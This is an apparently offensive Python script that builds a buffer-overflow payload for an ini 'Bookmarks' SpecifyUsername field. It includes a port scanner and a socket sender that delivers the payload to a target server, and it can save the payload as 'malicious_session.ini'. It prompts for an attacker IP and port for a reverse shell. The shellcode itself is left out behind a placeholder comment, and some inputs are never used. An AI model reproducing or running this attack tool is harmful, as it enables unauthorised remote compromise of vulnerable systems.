#!/usr/bin/env python

import socket
import sys
import time

def generate_payload(ip, port, username):
    # Linux x86 shellcode template (reverse shell)
    shellcode = (
        # ... (same shellcode as before)
    )
    return "[Bookmarks]\nSpecifyUsername=" + "A"*17000 + "B"*4 + "C"*4 + "D"*4 + shellcode

def send_payload(payload, target_ip, target_port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            s.sendall(payload.encode())
            print(f"Payload sent to {target_ip}:{target_port}")
    except Exception as e:
        print(f"Error sending payload: {str(e)}")

def port_scan(target_ip, scan_type):
    try:
        print(f"\nScanning {target_ip} for open ports...")
        if scan_type == "quick":
            ports = [22, 80, 443, 3389, 8080]  # Common ports
        elif scan_type == "long":
            ports = range(1, 1025)  # First 1024 ports
        else:
            print("Invalid scan type. Skipping scan.")
            return

        open_ports = []
        for port in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    s.connect((target_ip, port))
                    open_ports.append(port)
            except:
                continue

        print(f"\nOpen ports found on {target_ip}: {open_ports}")
        return open_ports

    except Exception as e:
        print(f"Scan error: {str(e)}")
        return []

def main():
    ip = input("Enter attacker's IP address: ").strip()
    
    # New prompt to open port
    open_port = input("Open port on attacker device? (y/n): ").lower()
    if open_port != "y":
        print("Warning: Port must be open for reverse shell to work!")
    
    port = input("Enter attacker's port (default: 443): ").strip() or "443"
    username = input("Enter SpecifyUsername value (default: 'hacked'): ").strip() or "hacked"
    
    payload = generate_payload(ip, port, username)
    
    # Display payload details before sending
    print("\nGenerated payload details:")
    print(f"Target username: {username}")
    print(f"Attacker IP: {ip}")
    print(f"Attacker port: {port}")
    print(f"Payload length: {len(payload)} bytes")
    print("\nPayload preview:")
    print(payload[:100] + "...")  # Show first 100 characters
    
    # Add port scanning option
    scan_choice = input("\nScan target for open ports? (quick/long/n): ").lower()
    if scan_choice in ["quick", "long"]:
        target_ip = input("Enter target server IP to scan: ").strip()
        open_ports = port_scan(target_ip, scan_choice)
        if open_ports:
            print(f"\nSuggested target ports: {open_ports}")
    
    # First prompt to send payload
    send_choice = input("\nSend payload to server? (y/n): ").lower()
    if send_choice == "y":
        target_ip = input("Enter target server IP: ").strip()
        target_port = int(input("Enter target server port: ").strip())
        send_payload(payload, target_ip, target_port)
    
    # Save to file (optional)
    save = input("Save to file? (y/n): ").lower() == "y"
    if save:
        with open("malicious_session.ini", "w") as f:
            f.write(payload)
        print("Payload saved to malicious_session.ini")

    # Second prompt to send payload (after saving)
    send_again = input("\nSend payload again? (y/n): ").lower()
    if send_again == "y":
        target_ip = input("Enter target server IP: ").strip()
        target_port = int(input("Enter target server port: ").strip())
        send_payload(payload, target_ip, target_port)

if __name__ == "__main__":
    main()
